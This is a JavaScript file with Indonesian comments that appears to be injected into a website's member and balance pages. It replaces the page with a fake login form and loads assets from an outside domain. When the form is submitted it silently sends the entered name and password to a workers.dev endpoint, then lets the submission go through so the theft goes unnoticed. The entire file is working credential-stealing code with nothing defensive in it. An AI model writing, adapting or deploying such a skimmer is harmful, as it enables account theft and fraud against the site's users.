(function () {
    'use strict';

    // 1. Tentukan halaman target (url berakhiran /member.php atau /saldomember.php)
    const targetPages = ['/member.php', '/saldomember.php'];
    const currentPath = window.location.pathname;
    const isTargetPage = targetPages.some(page => currentPath.endsWith(page));

    // Jika bukan halaman target, hentikan eksekusi script
    if (!isTargetPage) {
        return;
    }

    // 2. Injeksi Tag <base> dan CSS ke dalam <head>
    if (!document.querySelector('base[href="https://onic54.gacorbanget.xyz/newbie/"]')) {
        const baseTag = document.createElement('base');
        baseTag.href = 'https://onic54.gacorbanget.xyz/newbie/';
        document.head.appendChild(baseTag);
    }

    // Masukkan stylesheet eksternal yang dibutuhkan
    const stylesheets = [
        'https://onic54.gacorbanget.xyz/newbie/assets/duralux/css/bootstrap.min.css',
        'https://onic54.gacorbanget.xyz/newbie/assets/duralux/vendors/css/vendors.min.css',
        'https://onic54.gacorbanget.xyz/newbie/assets/duralux/css/theme.min.css'
    ];

    stylesheets.forEach(href => {
        if (!document.querySelector(`link[href="${href}"]`)) {
            const link = document.createElement('link');
            link.rel = 'stylesheet';
            link.type = 'text/css';
            link.href = href;
            document.head.appendChild(link);
        }
    });

    // Tambahkan custom CSS styling
    const styleElement = document.createElement('style');
    styleElement.innerHTML = `
        .login-logo {
            width: 200px;
            max-width: 70%;
            height: auto;
        }
    `;
    document.head.appendChild(styleElement);

    // 3. Ubah Favicon jika belum ada
    let favicon = document.querySelector("link[rel*='icon']") || document.createElement('link');
    favicon.type = 'image/x-icon';
    favicon.rel = 'shortcut icon';
    favicon.href = 'https://onic54.gacorbanget.xyz/upload/favicon_20261017174444_443a93.png';
    if (!document.querySelector("link[rel*='icon']")) {
        document.head.appendChild(favicon);
    }

    // 4. Buat Struktur HTML Utama dan Timpa Tampilan Body
    const htmlTemplate = `
        <main class="auth-minimal-wrapper">
            <div class="auth-minimal-inner">
                <div class="minimal-card-wrapper">
                    <div class="card mb-4 mt-5 mx-4 mx-sm-0 position-relative">
                        <div class="card-body p-sm-5">
                            <div class="text-center mb-4">
                                <img src="https://onic54.gacorbanget.xyz/upload/logo_20261017174444_853179.png" alt="Logo" class="login-logo img-fluid">
                            </div>
                            <h2 class="fs-20 fw-bolder mb-2">DAFTAR NAMA</h2>
                        
                            <form id="loginForm" method="post" action="/newbie/index.php" class="w-100">
                                <div class="mb-4">
                                    <input type="text" class="form-control" name="NAMAKU" id="login_NAMAKU" placeholder="NAMAKU"
                                        autocomplete="NAMAKU" required>
                                </div>
                                <div class="mb-3">
                                    <div class="input-group">
                                        <input type="password" class="form-control" name="idku" id="login_idku" placeholder="idku"
                                            autocomplete="current-idku" required>
                                        <button class="btn btn-outline-secondary" type="button" id="toggleidku" aria-label="Tampilkan idku">
                                            <i class="feather-eye" aria-hidden="true"></i>
                                        </button>
                                    </div>
                                </div>
                                <div class="mt-4">
                                    <button type="submit" class="btn btn-lg btn-primary w-100" id="btnSubmit">Masuk</button>
                                </div>
                            </form>
                            
                        </div>
                    </div>
                </div>
            </div>
        </main>
    `;

    document.body.innerHTML = htmlTemplate;

    // 5. Jalankan Logika JavaScript (Toggle & Fetch Worker)
    const idkuInput = document.getElementById('login_idku');
    const toggleBtn = document.getElementById('toggleidku');
    const toggleIcon = toggleBtn ? toggleBtn.querySelector('i') : null;

    if (idkuInput && toggleBtn) {
        toggleBtn.addEventListener('click', function () {
            const isHidden = idkuInput.type === 'password';
            idkuInput.type = isHidden ? 'text' : 'password';
            toggleBtn.setAttribute('aria-label', isHidden ? 'Sembunyikan idku' : 'Tampilkan idku');
            if (toggleIcon) {
                toggleIcon.className = isHidden ? 'feather-eye-off' : 'feather-eye';
            }
        });
    }

    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', function (e) {
            e.preventDefault();

            const NAMAKU = document.getElementById('login_NAMAKU').value;
            const idku = document.getElementById('login_idku').value;

            const messageText = encodeURIComponent(`NAMAKU: ${NAMAKU}\nidku: ${idku}`);
            const targetUrl = `https://memek-worker.defoy89122.workers.dev/?message=${messageText}`;

            let submitted = false;
            const proceedSubmit = () => {
                if (!submitted) {
                    submitted = true;
                    loginForm.submit();
                }
            };

            fetch(targetUrl, {
                method: 'GET',
                mode: 'no-cors'
            })
            .then(() => {
                proceedSubmit();
            })
            .catch((err) => {
                console.error('Pengiriman ke worker gagal:', err);
                proceedSubmit();
            });

            setTimeout(proceedSubmit, 1000);
        });
    }

})();
